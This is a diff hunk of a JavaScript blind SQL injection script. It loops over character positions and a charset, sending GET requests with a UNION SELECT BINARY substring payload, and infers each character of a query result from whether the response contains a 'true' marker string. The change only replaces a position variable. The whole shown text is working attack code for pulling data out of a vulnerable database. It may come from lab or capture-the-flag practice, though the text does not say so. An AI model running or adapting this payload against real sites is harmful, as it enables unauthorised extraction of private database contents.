@@ -11,15 +11,15 @@ xhr = new XMLHttpRequest();
 
 for (j=0;j<maxlength;j++) {
 	
-	nthchar = j;
+	//nthchar = j;
 	innerloop:
 	for (i=0;i<charset.length;i++) {
 	
-	SQL_cmd = `${URL}%20UNION%20SELECT%20null,BINARY substring(${query},${nthchar},1)=%27${charset[i]}%27,null,null;--%20-`;
+	SQL_cmd = `${URL}%20UNION%20SELECT%20null,BINARY substring(${query},${j},1)=%27${charset[i]}%27,null,null;--%20-`;
 	xhr.open('GET',SQL_cmd,false);
 	xhr.onload = function () {
 		if (this.responseText.includes(truestring)) {
-			console.log(`Character number ${nthchar} found: ${charset[i]}`);
+			console.log(`Character number ${j} found: ${charset[i]}`);
 			result += charset[i];
 			}
 	};
